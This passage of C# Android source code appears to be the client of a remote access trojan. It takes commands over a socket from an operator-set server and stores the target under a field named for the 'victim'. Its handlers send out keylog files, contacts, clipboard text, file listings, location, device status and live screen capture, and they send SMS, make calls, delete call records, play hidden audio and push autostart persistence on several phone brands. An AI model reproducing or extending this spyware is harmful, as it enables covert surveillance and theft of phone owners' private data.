                                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                                    }
                                    catch (Exception) { }
                                }
                                else
                                {
                                    try
                                    {
                                        byte[] dataPacker = MyDataPacker("LOGDOSYA", System.Text.Encoding.UTF8.GetBytes("LOG_YOK"));
                                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                                    }
                                    catch (Exception) { }
                                }
                                break;

                            case "<KEYCEK>":
                                string icerik = File.ReadAllText(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + System.Text.Encoding.UTF8.GetString(dataBuff)).Replace(System.Environment.NewLine, "[NEW_LINE]");
                                try
                                {
                                    byte[] dataPacker = MyDataPacker("KEYGONDER", System.Text.Encoding.UTF8.GetBytes(icerik));
                                    Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                                }
                                catch (Exception) { }
                                break;

                            case "<DOSYAAC>":
                                Ac(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;

                            case "<GIZLI>":
                                StartPlayer(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;
                            case "<GIZKAPA>":
                                if (player != null)
                                {
                                    player.Stop();
                                }
                                break;

                            case "<VOLUMELEVELS>":
                                sesBilgileri();
                                break;

                            case "<ZILSESI>":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Ring, int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff)), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;
                            case "<MEDYASESI>":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Music, int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff)), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;
                            case "<BILDIRIMSESI>":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Notification, int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff)), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;

                            case "<REHBERIVER>":
                                rehberLogu();
                                break;

                            case "<REHBERISIM>":
                                string[] ayir = System.Text.Encoding.UTF8.GetString(dataBuff).Split('=');
                                rehberEkle(ayir[1], ayir[0]);
                                break;

                            case "<REHBERSIL>":
                                rehberNoSil(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;
                            case "<VIBRATION>":
                                try
                                {
                                    Vibrator vibrator = (Vibrator)GetSystemService(VibratorService);
                                    vibrator.Vibrate(int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff)));
                                }
                                catch (Exception) { }
                                break;

                            case "<FLASH>":
                                flashIsik(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;
                            case "<TOST>":
                                Toast.MakeText(this, System.Text.Encoding.UTF8.GetString(dataBuff), ToastLength.Long).Show();
                                break;
                            case "<APPLICATIONS>":
                                uygulamalar();
                                break;

                            case "<OPENAPP>":
                                try
                                {
                                    Intent intent = PackageManager.GetLaunchIntentForPackage(System.Text.Encoding.UTF8.GetString(dataBuff));
                                    intent.AddFlags(ActivityFlags.NewTask);
                                    StartActivity(intent);
                                }
                                catch (Exception) { }
                                break;
                            case "<DELETECALL>":
                                DeleteCallLogByNumber(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;

                            case "<SARJ>":
                                try
                                {
                                    var filter = new IntentFilter(Intent.ActionBatteryChanged);
                                    var battery = RegisterReceiver(null, filter);
                                    int level = battery.GetIntExtra(BatteryManager.ExtraLevel, -1);
                                    int scale = battery.GetIntExtra(BatteryManager.ExtraScale, -1);
                                    int BPercetage = (int)Math.Floor(level * 100D / scale);
                                    var per = BPercetage.ToString();

                                    try
                                    {
                                        byte[] dataPacker = MyDataPacker("TELEFONBILGI", System.Text.Encoding.UTF8.GetBytes("[VERI]" + per.ToString() + "[VERI]" + ekranDurumu() + "[VERI]" + usbDurumu()
                                     + "[VERI]" + mobil_Veri() + "[VERI]" + wifi_durumu() + "[VERI]" + gps_durum() + "[VERI]" + btisEnabled() + "[VERI]" + fetchAllInfo() + "[VERI]" + ramInfo() + "[VERI]" + storageInfo() + "[VERI]" + wifiEnabled()));
                                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                                    }
                                    catch (Exception) { }
                                }
                                catch (Exception) { }
                                break;

                            case "<UPDATE>":
                                try
                                {
                                    string[] myd = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                    Preferences.Set("aypi_adresi", myd[2]);
                                    Preferences.Set("port", myd[3]);
                                    Preferences.Set("kurban_adi", myd[1]);
                                    Preferences.Set("pass", myd[4]);
                                    PASSWORD = Preferences.Get("pass", string.Empty);
                                    MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");
                                    MainValues.port = int.Parse(Preferences.Get("port", "9999"));
                                    MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "xxxx");
                                }
                                catch (Exception) { }
                                break;

                            case "<WALLPAPERBYTE>":
                                try
                                {
                                    duvarKagidi(System.Text.Encoding.UTF8.GetString(dataBuff));
                                }
                                catch (Exception) { }
                                break;
                            case "<WALLPAPERGET>":
                                duvarKagidiniGonder();
                                break;
                            case "<PANOGET>":
                                panoyuYolla();
                                break;
                            case "<PANOSET>":
                                panoAyarla(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;
                            case "<SMSGONDER>":
                                string[] baki = System.Text.Encoding.UTF8.GetString(dataBuff).Split('=');
                                try
                                {
                                    PendingIntent sentPI = PendingIntent.GetBroadcast(this, 0, new Intent("SMS_SENT"), 0);
                                    SmsManager.Default.SendTextMessage(baki[0], null,
                                           baki[1], sentPI, null);

                                }
                                catch (Exception) { }
                                break;
                            case "<ARA>":
                                MakePhoneCall(System.Text.Encoding.UTF8.GetString(dataBuff));
                                break;
                            case "<URL>":
                                try
                                {
                                    var uri = Android.Net.Uri.Parse(System.Text.Encoding.UTF8.GetString(dataBuff));
                                    var intent = new Intent(Intent.ActionView, uri);
                                    intent.AddFlags(ActivityFlags.NewTask);
                                    StartActivity(intent);
                                }
                                catch (Exception) { }
                                break;
                            case "<KONUM>":
                                lokasyonCek();
                                break;
                            case "<PARLAKLIK>":
                                try { setBrightness(int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff))); } catch (Exception) { }
                                break;
                            case "<LOGTEMIZLE>":
                                DirectoryInfo dinfo_ = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                                FileInfo[] fileInfos_ = dinfo_.GetFiles("*.tht");
                                if (fileInfos_.Length > 0)
                                {
                                    foreach (FileInfo fileInfo in fileInfos_)
                                    {
                                        fileInfo.Delete();
                                    }
                                }
                                break;

                            case "<SHORTCUT>":
                                string[] shrt = tag.Split('|')[2].Replace(">", "").Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                AddShortcut(shrt[0], shrt[1], dataBuff);
                                break;

                            case "<SCREENLIVEOPEN>":
                                kalite = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff).Replace("%", ""));
                                startProjection();
                                break;
                            case "<SCREENLIVECLOSE>":
                                stopProjection();
                                break;
                            case "<SCREENQUALITY>":
                                kalite = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff).Replace("%", ""));
                                break;
                            case "<CONCLOSE>":
                                CLOSE_CONNECTION = true;
                                break;
                            case "<UNINSTALL>":
                                Uninstall();
                                break;
                        }
                    }
                    catch (Exception) { }
                });
            });
        }
        string myid = default;
        public string GetIdentifier()
        {
            try
            {
                return Settings.Secure.GetString(ContentResolver, Settings.Secure.AndroidId);
            }
            catch (Exception) { return myid; }
        }
        public string telefondanIsim(string telefon)
        {
            return getContactbyPhoneNumber(this, telefon);
        }
        public string getContactbyPhoneNumber(Context c, string phoneNumber)
        {
            try
            {
                Android.Net.Uri uri = Android.Net.Uri.WithAppendedPath(ContactsContract.PhoneLookup.ContentFilterUri, phoneNumber);
                string[] projection = { ContactsContract.Contacts.InterfaceConsts.DisplayName };
                using (ICursor cursor = c.ContentResolver.Query(uri, projection, null, null, null))
                {
                    if (cursor == null)
                    {
                        return phoneNumber;
                    }
                    else
                    {
                        string name = phoneNumber;
                        try
                        {

                            if (cursor.MoveToFirst())
                            {
                                name = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));
                            }
                        }
                        finally
                        {
                            cursor.Close();
                        }

                        return name;
                    }
                }
            }
            catch (Exception) { return "error"; }
        }
        public void cihazDosyalariGonder()
        {
            System.Text.StringBuilder dosyalarS = new System.Text.StringBuilder();
            for (int c = 0; c < allDirectory_.Count; c++)
            {
                dosyalarS.Append(allDirectory_[c] + "<");
            }
            if (!string.IsNullOrEmpty(dosyalarS.ToString()))
            {
                try
                {
                    byte[] senddata = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]CIHAZ[VERI]" + dosyalarS.ToString()));
                    Soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
            else
            {
                try
                {
                    byte[] senddata = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]CIHAZ[VERI]" + "BOS"));
                    Soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }
        public void dosyalariGonder()
        {
            System.Text.StringBuilder dosyalarS = new System.Text.StringBuilder();
            for (int y = 0; y < allDirectory_.Count; y++)
            {
                dosyalarS.Append(allDirectory_[y] + "<");
            }
            if (!string.IsNullOrEmpty(dosyalarS.ToString()))
            {
                try
                {
                    byte[] senddata = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]SDCARD[VERI]" + dosyalarS.ToString()));
                    Soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
            else
            {
                try
                {
                    byte[] senddata = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]SDCARD[VERI]" + "BOS"));
                    Soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }
        public string usbDurumu()
        {
            string status = "";
            try
            {
                var source = Battery.PowerSource;
                switch (source)
                {
                    case BatteryPowerSource.Battery:
                        status = "BATTERY";
                        break;
                    case BatteryPowerSource.AC:
                        status = "PLUG";
                        break;
                    case BatteryPowerSource.Usb:
                        status = "USB";
                        break;
                    case BatteryPowerSource.Wireless:
                        status = "WIRELESS";
                        break;
                    case BatteryPowerSource.Unknown:
                        status = "UNKNOWN";
                        break;
                }
                return status + "[VERI]";
            }
            catch (Exception) { status = "UNKNOWN[VERI]"; return status; }
        }
        private string wifiEnabled()
        {
            try
            {
                WifiManager wifiManager = (WifiManager)Application.Context.GetSystemService(WifiService);
                return " (" + wifiManager.IsWifiEnabled.ToString().ToLower().Replace("true", "enabled").Replace("false", "disabled") + ")";
            }
            catch (Exception) { return " (An error occured.)"; }
        }
        public string wifi_durumu()
        {
            try
            {
                Android.Net.ConnectivityManager connManager = (Android.Net.ConnectivityManager)GetSystemService(ConnectivityService);
                Android.Net.NetworkInfo mWifi = connManager.GetNetworkInfo(Android.Net.ConnectivityType.Wifi);

                if (!mWifi.IsConnected)
                {
                    return "Wi-Fi not connected.";
                }
                WifiManager wifiManager = (WifiManager)Application.Context.GetSystemService(WifiService);
                if (wifiManager != null)
                {
                    WifiInfo wifiInfo = wifiManager.ConnectionInfo;
                    int level = WifiManager.CalculateSignalLevel(wifiInfo.Rssi, 5);
                    return wifiInfo.SSID + "[WIFI]" + level.ToString();
                }
                else
                {
                    return "null";
                }
            }
            catch (Exception) { return "An error occured."; }
        }
        private string ramInfo()
        {
            try
            {
                ActivityManager actManager = (ActivityManager)GetSystemService(ActivityService);
                ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
                actManager.GetMemoryInfo(memInfo);
                long totalMemory = memInfo.TotalMem;
                var nativeHeapFreeSize = memInfo.AvailMem;
                var usedMemInBytes = totalMemory - nativeHeapFreeSize;
                return totalMemory.ToString() + "?" + usedMemInBytes.ToString() + "?" + memInfo.AvailMem.ToString();
            }
            catch (Exception) { return "unknown"; }
        }
        private string storageInfo()
        {
            try
            {
                double totalSize = new Java.IO.File(FilesDir.AbsoluteFile.ToString()).TotalSpace;
                //double totMb = totalSize / (1024 * 1024);
                var fullInternalStorage = totalSize;//(statFs.BlockCount * statFs.BlockSize) + Android.OS.Environment.RootDirectory.TotalSpace + Android.OS.Environment.ExternalStorageDirectory.TotalSpace;
                var freeInternalStorage = new Java.IO.File(FilesDir.AbsoluteFile.ToString()).FreeSpace;
                return freeInternalStorage.ToString() + "?" + fullInternalStorage.ToString();
            }
            catch (Exception) { return "unknown"; }
        }
        private void btKapaAc(bool ac_kapa)
        {
            try
            {
                BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.DefaultAdapter;
                if (ac_kapa == false)
                {
                    if (mBluetoothAdapter.IsEnabled)
                    {
                        mBluetoothAdapter.Disable();
                    }
                }
                else
                {
                    if (ac_kapa == true)
                    {
                        if (mBluetoothAdapter.IsEnabled == false)
                        {
                            mBluetoothAdapter.Enable();
                        }
                    }
                }
            }
            catch (Exception) { }
        }
        public void wifiAcKapa(bool acKapa)
        {
            try
            {
                WifiManager wifi = (WifiManager)GetSystemService(WifiService);
                wifi.SetWifiEnabled(acKapa);
            }
            catch (Exception) { }
        }
        public void setBrightness(int brightness)
        {
            if (brightness < 0)
                brightness = 0;
            else if (brightness > 255)
                brightness = 255;
            try
            {
                Settings.System.PutInt(ContentResolver,
                        Settings.System.ScreenBrightnessMode,
                       (int)ScreenBrightness.ModeManual);
            }
            catch (Exception) { }
            try
            {
                ContentResolver cResolver = ContentResolver;
                Settings.System.PutInt(cResolver, Settings.System.ScreenBrightness, brightness);
            }
            catch (Exception) { }

        }
        public string mobil_Veri()
        {
            try
            {
                Android.Net.ConnectivityManager conMan = (Android.Net.ConnectivityManager)
                    GetSystemService(ConnectivityService);
                //mobile
                var mobile = conMan.GetNetworkInfo(Android.Net.ConnectivityType.Mobile).GetState();

                bool mobileYN = false;
                Context context = this;

                if (Build.VERSION.SdkInt >= BuildVersionCodes.JellyBeanMr1)
                {
                    mobileYN = Settings.Global.GetInt(context.ContentResolver, "mobile_data", 1) == 1;
                }
                else
                {
                    mobileYN = Settings.Secure.GetInt(context.ContentResolver, "mobile_data", 1) == 1;
                }
                return mobileYN ? "Opened/" + ((mobile == Android.Net.NetworkInfo.State.Connected) ? "Internet" : "No Internet") : "Closed";
            }
            catch (Exception) { return "An error occured."; }
        }
        public string gps_durum()
        {
            try
            {
                LocationManager locationManager = (LocationManager)GetSystemService(LocationService);
                if (locationManager.IsProviderEnabled(LocationManager.GpsProvider))
                {
                    return "Turned on";
                }
                else
                {
                    return "Turned off";
                }
            }
            catch (Exception) { return "An error occured."; }
        }
        private string btisEnabled()
        {
            try
            {
                BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.DefaultAdapter;
                return mBluetoothAdapter.IsEnabled ? "Turned on" : "Turned off";
            }
            catch (Exception) { return "An error occured."; }
        }
        public string ekranDurumu()
        {
            try
            {
                string KEY_DURUMU = "";
                string EKRAN_DURUMU = "";
                KeyguardManager myKM = (KeyguardManager)GetSystemService(KeyguardService);
                bool isPhoneLocked = myKM.InKeyguardRestrictedInputMode();
                bool isScreenAwake = default;
                KEY_DURUMU = (isPhoneLocked) ? "LOCKED" : "UNLOCKED";
                PowerManager powerManager = (PowerManager)GetSystemService(PowerService);
                isScreenAwake = (int)Build.VERSION.SdkInt < 20 ? powerManager.IsScreenOn : powerManager.IsInteractive;
                EKRAN_DURUMU = isScreenAwake ? "SCREEN ON" : "SCREEN OFF";

                return KEY_DURUMU + "&" + EKRAN_DURUMU + "&";
            }
            catch (Exception) { return "An error occured.&An error occured."; }

        }
        public async void panoAyarla(string input)
        {
            try { await Clipboard.SetTextAsync(input); } catch (Exception) { }
        }
        public async void panoyuYolla()
        {
            var pano = "An error occured.";
            try
            {
                pano = await Clipboard.GetTextAsync();
            }
            catch (Exception) { }

            if (string.IsNullOrEmpty(pano)) { pano = "[NULL]"; }
            try
            {
                byte[] dataPacker = MyDataPacker("PANOGELDI", System.Text.Encoding.UTF8.GetBytes(pano.Replace(
                    System.Environment.NewLine, "[NEW_LINE]")));
                Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }       
        public async Task<byte[]> wallPaper(string linq)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    return await wc.DownloadDataTaskAsync(linq);
                }
            }
            catch (Exception)
            {

                return new byte[] { };
            }
        }
        public async void duvarKagidi(string yol)
        {

            try
            {
                byte[] uzant = await wallPaper(yol);
                if (uzant.Length > 0)
                {
                    Bitmap bitmap = BitmapFactory.DecodeByteArray(uzant, 0, uzant.Length); //Android.Graphics.BitmapFactory.DecodeByteArray(veri,0,veri.Length);
                    WallpaperManager manager = WallpaperManager.GetInstance(ApplicationContext);
                    manager.SetBitmap(bitmap);
                    bitmap.Dispose();
                    manager.Dispose();
                }
            }
            catch (Exception) { }
        }
        public void duvarKagidi(byte[] content)
        {

            try
            {
                if (content.Length > 0)
                {
                    Bitmap bitmap = BitmapFactory.DecodeByteArray(content, 0, content.Length); //Android.Graphics.BitmapFactory.DecodeByteArray(veri,0,veri.Length);
                    WallpaperManager manager = WallpaperManager.GetInstance(ApplicationContext);
                    manager.SetBitmap(bitmap);
                    bitmap.Dispose();
                    manager.Dispose();
                }
            }
            catch (Exception) { }
        }
        public byte[] ResizeImage(byte[] imageData, float width, float height)
        {
            try
            {
                // Load the bitmap 
                BitmapFactory.Options options = new BitmapFactory.Options();// Create object of bitmapfactory's option method for further option use
                options.InPurgeable = true; // inPurgeable is used to free up memory while required
                Bitmap originalImage = BitmapFactory.DecodeByteArray(imageData, 0, imageData.Length, options);
                float newHeight = 0;
                float newWidth = 0;
                var originalHeight = originalImage.Height;
                var originalWidth = originalImage.Width;
                if (originalHeight > originalWidth)
                {
                    newHeight = height;
                    float ratio = originalHeight / height;
                    newWidth = originalWidth / ratio;
                }
                else
                {
                    newWidth = width;
                    float ratio = originalWidth / width;
                    newHeight = originalHeight / ratio;
                }
                Bitmap resizedImage = Bitmap.CreateScaledBitmap(originalImage, (int)newWidth, (int)newHeight, true);
                originalImage.Recycle();
                using (MemoryStream ms = new MemoryStream())
                {
                    resizedImage.Compress(Bitmap.CompressFormat.Jpeg, 75, ms);
                    resizedImage.Recycle();
                    return ms.ToArray();
                }
            }
            catch (Exception)
            {
                return default;
            }
        }
        public void preview(string resim)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(resim);
                file.SetReadable(true);
                byte[] bit = ResizeImage(File.ReadAllBytes(resim), 175, 175);
                if (bit.Length > 0)
                {
                    try
                    {
                        byte[] dataPacker = MyDataPacker("PREVIEW", bit);
                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception) { }
        }
        public void duvarKagidiniGonder()
        {
            DisplayInfo mainDisplayInfo = DeviceDisplay.MainDisplayInfo;
            WallpaperManager manager = WallpaperManager.GetInstance(this);
            if (manager != null)
            {
                try
                {
                    var image = manager.Drawable;
                    if (image != null)
                    {
                        Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
                        byte[] bitmapData = default;
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Jpeg, 50, ms);
                            bitmapData = ms.ToArray();
                        }
                        string resolution = mainDisplayInfo.Height + " x " + mainDisplayInfo.Width;

                        try
                        {
                            byte[] dataPacker = MyDataPacker("WALLPAPERBYTES", bitmapData, resolution);
                            Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                        }
                        catch (Exception) { }
                    }
                    else
                    {
                        try
                        {
                            byte[] dataPacker = MyDataPacker("WALLERROR", System.Text.Encoding.UTF8.GetBytes("There is no wallpaper has been set."));
                            Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                        }
                        catch (Exception) { }
                    }
                }
                catch (Exception ex)
                {
                    try
                    {
                        byte[] dataPacker = MyDataPacker("WALLERROR", System.Text.Encoding.UTF8.GetBytes(ex.Message));
                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
        }
        public string wallpaper()
        {
            WallpaperManager manager = WallpaperManager.GetInstance(this);
            if (manager != null)
            {
                try
                {
                    var image = manager.Drawable;
                    if (image != null)
                    {
                        Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
                        byte[] bitmapData = default;
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Jpeg, 30, ms);
                            bitmapData = ms.ToArray();
                        }
                        return Convert.ToBase64String(bitmapData);
                    }
                    else
                    {
                        return "null";
                    }
                }
                catch (Exception)
                {
                    return "null";
                }
            }
            return "null";
        }
        public async void flashIsik(string ne_yapam)
        {
            try
            {
                switch (ne_yapam)
                {
                    case "AC":
                        await Flashlight.TurnOnAsync();
                        break;
                    case "KAPA":
                        await Flashlight.TurnOffAsync();
                        break;
                }
            }
            catch (Exception) { }
        }
        public void MakePhoneCall(string number)
        {
            try
            {
                var uri = Android.Net.Uri.Parse("tel:" + Android.Net.Uri.Encode(number));
                Intent intent = new Intent(Intent.ActionCall, uri);
                intent.AddFlags(ActivityFlags.NewTask);
                StartActivity(intent);
            }
            catch (Exception) { }
        }
        public void DeleteCallLogByNumber(string number)
        {
            try
            {
                Android.Net.Uri CALLLOG_URI = Android.Net.Uri.Parse("content://call_log/calls");
                ContentResolver.Delete(CALLLOG_URI, CallLog.Calls.Number + "=?", new string[] { number });
            }
            catch (Exception) { }
        }
        protected MediaPlayer player = new MediaPlayer();
        public void StartPlayer(string filePath)
        {
            try
            {
                Android.Net.Uri uri = Android.Net.Uri.FromFile(new Java.IO.File(filePath));//Android.Net.Uri.Parse("file://" + filePath);
                player.Reset();
                player.SetDataSource(this, uri);
                player.Prepare();
                player.Start();

            }
            catch (Exception) { }
        }
        System.Text.StringBuilder log_dosylari_gonder = new System.Text.StringBuilder();
        Android.Media.AudioManager mgr = null;
        public void sesBilgileri()
        {
            string ZIL_SESI = "0/0";
            string MEDYA_SESI = "0/0";
            string BILDIRIM_SESI = "0/0";
            try
            {
                mgr = (Android.Media.AudioManager)GetSystemService(AudioService);
                //Zil sesi
                int max = mgr.GetStreamMaxVolume(Android.Media.Stream.Ring);
                int suankiZilSesi = mgr.GetStreamVolume(Android.Media.Stream.Ring);
                ZIL_SESI = suankiZilSesi.ToString() + "/" + max.ToString();
                //Medya
                int maxMedya = mgr.GetStreamMaxVolume(Android.Media.Stream.Music);
                int suankiMedya = mgr.GetStreamVolume(Android.Media.Stream.Music);
                MEDYA_SESI = suankiMedya.ToString() + "/" + maxMedya.ToString();
                //Bildirim Sesi
                int maxBildirim = mgr.GetStreamMaxVolume(Android.Media.Stream.Notification);
                int suankiBildirim = mgr.GetStreamVolume(Android.Media.Stream.Notification);
                BILDIRIM_SESI = suankiBildirim.ToString() + "/" + maxBildirim.ToString();
            }
            catch (Exception) { }
            //Ekran Parlaklığı
            int parlaklik = 0;
            try
            {
                parlaklik = Settings.System.GetInt(ContentResolver, Settings.System.ScreenBrightness, 0);
            }
            catch (Exception) { }
            string gonderilecekler = ZIL_SESI + "=" + MEDYA_SESI + "=" + BILDIRIM_SESI + "=" + parlaklik.ToString() + "=";
            try
            {
                byte[] dataPacker = MyDataPacker("SESBILGILERI", System.Text.Encoding.UTF8.GetBytes(gonderilecekler));
                Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }
        public void openAutostartSettings(Context kontext)
        {
            Intent intent = new Intent();
            string manufacturer = Build.Manufacturer;
            try
            {
                if (manufacturer.ToLower().Contains("xiaomi"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("oppo"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("vivo"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.vivo.permissionmanager",
                "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("letv"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.letv.android.letvsafe",
                "com.letv.android.letvsafe.AutobootManageActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("honor"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.huawei.systemmanager",
                "com.huawei.systemmanager.optimize.process.ProtectActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("huawe"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                    ));
                }
                else
                {
                    //Debug.WriteLine("Auto-start permission not necessary")
                }
                var list = kontext.PackageManager
                    .QueryIntentActivities(intent, PackageInfoFlags.MatchDefaultOnly);
                if (list.Count > 0)
                {
                    intent.SetFlags(ActivityFlags.NewTask);
                    kontext.StartActivity(intent);
                }
            }
            catch (Exception)
            {
                try
                {
                    if (manufacturer.ToLower().Contains("huawe"))
                    {
                        intent.SetComponent(new ComponentName(
                            "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.bootstart.BootStartActivity"
                        ));
                    }
                    var list = kontext.PackageManager
                        .QueryIntentActivities(intent, PackageInfoFlags.MatchDefaultOnly);
                    if (list.Count > 0)
                    {
                        intent.SetFlags(ActivityFlags.NewTask);
                        kontext.StartActivity(intent);
                    }
                }
                catch (Exception) { }
            }

        }
    }
}